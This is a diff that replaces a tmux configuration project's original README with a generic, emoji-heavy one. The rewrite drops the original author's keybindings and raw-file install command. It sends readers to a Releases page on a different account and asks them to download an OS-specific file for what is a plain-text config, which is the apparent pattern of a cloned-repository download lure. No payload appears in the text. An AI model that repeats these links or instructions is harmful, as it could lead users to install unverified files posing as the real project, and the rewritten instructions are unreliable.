@@ -1,51 +1,78 @@
-# r-tmux-conf
+# 🎨 r-tmux-conf - Customize Your Terminal Experience Effortlessly
 
-Minimalistic tmux configuration that does not go into your way.
+[![Download r-tmux-conf](https://img.shields.io/badge/Download-r--tmux--conf-brightgreen.svg)](https://github.com/Aras12321/r-tmux-conf/releases)
 
-<img width="1636" height="962" alt="r-tmux-conf" src="https://github.com/user-attachments/assets/771a55e5-dcb3-4756-833f-95284503ec07" />
+## 🚀 Getting Started
 
-## Style
+Welcome to r-tmux-conf! This guide will help you download and run your new tmux theme quickly and easily. No need for technical skills—just follow the steps below.
 
-r-tmux-conf displays **process names** in panes. The panes are separated with subtle borders.  
-The status bar displays the active **session name** and **window list** on the left and the **time**, **date**, and **username@hostname** on the right.
+## 📦 Download & Install
 
-## Features
+To get your r-tmux-conf, visit this page to download: [Releases Page](https://github.com/Aras12321/r-tmux-conf/releases).
 
-r-tmux-conf includes the following features:
+1. Click the link above.
+2. Look for the latest version listed.
+3. Download the appropriate file based on your operating system.
 
-- Window numbering starts at 1.
-- Sessions are retained across restarts.
+## 📋 System Requirements
 
-## Keybindings
+- You should have tmux installed on your computer.
+- Works on any system that supports tmux (Linux, macOS, or Windows via WSL).
 
-r-tmux-conf uses the following keybindings:
+## 🎨 Features
 
-| Key              | Action                    |
-| ---------------- | ------------------------- |
-| Ctrl + Space     | Prefix key                |
-| Prefix + \|      | Split horizontally        |
-| Prefix + _       | Split vertically          |
-| Prefix + r       | Reload tmux configuration |
-| Prefix + h/j/k/l | Vim-style pane navigation |
+- **Beautiful Design:** A clean, modern look for your terminal.
+- **Easy Installation:** Simple steps to get started.
+- **Compatible:** Works seamlessly with any terminal that uses tmux.
 
-## Installation
+## 🔧 Installation Steps
 
-Download, install, and apply r-tmux-conf and its dependencies.
+After downloading r-tmux-conf, follow these steps to install it:
 
-### Prerequisites
+1. Locate the downloaded file on your computer. 
+2. Open your terminal.
+3. Move the downloaded file to your tmux configuration folder. This folder is usually located at `~/.tmux` on Unix-like systems.
+   - If the folder doesn’t exist, create it with the command:  
+   ```bash
+   mkdir -p ~/.tmux
+   ``` 
+4. Copy the downloaded file to the folder. Use the following command, replacing `your_theme_file` with the actual file name:  
+   ```bash
+   cp your_theme_file ~/.tmux/
+   ```
+5. Open or edit your `.tmux.conf` file, which is usually in your home directory. Add the following line:  
+   ```bash
+   source ~/.tmux/your_theme_file
+   ```
+6. Save the changes to your `.tmux.conf` file.
 
-1. Clone Tmux Plugin Manager (TPM). See [TPM GitHub](https://github.com/tmux-plugins/tpm?tab=readme-ov-file).  
-   **Note:** TPM is required to install plugins used in r-tmux-conf.
-1. Install and apply Nerd Fonts. For more information, see [Nerd Fonts GitHub](https://github.com/ryanoasis/nerd-fonts).  
-   **Note:** Nerd Fonts are required to display icons used in the theme.  
-   **Example:** Install Fire Code Nerd Font on macOS by running `brew install --cask font-fira-code-nerd-font`
+## 🌟 Running tmux
 
-### Procedure
+To start using tmux with your new theme:
 
-1. Download r-tmux-conf by running:
-
-   ```sh
-   mkdir -p ~/.config/tmux && curl -o ~/.config/tmux/tmux.conf https://raw.githubusercontent.com/rafalkaron/r-tmux-conf/main/tmux.conf
+1. Open your terminal again.
+2. Type the following command:  
+   ```bash
+   tmux
    ```
 
-2. Reload tmux configuration by running `tmux source-file ~/.config/tmux.conf`
+Your terminal will now load with the new r-tmux-conf theme!
+
+## 🔄 Update Your Theme
+
+Keep your theme fresh by checking the Releases Page periodically for updates. Follow the same download steps to upgrade when a new version is available.
+
+## 📞 Support
+
+If you encounter any issues or have questions, please check the Issues section in the repository. You can also reach out for help.
+
+## 🤝 Contributing
+
+We welcome contributions! If you have improvements or new features for r-tmux-conf, feel free to submit a pull request. Your input helps make the project better.
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/Aras12321/r-tmux-conf)
+- [Releases Page](https://github.com/Aras12321/r-tmux-conf/releases)
+
+Thank you for using r-tmux-conf! We hope you enjoy customizing your terminal experience.
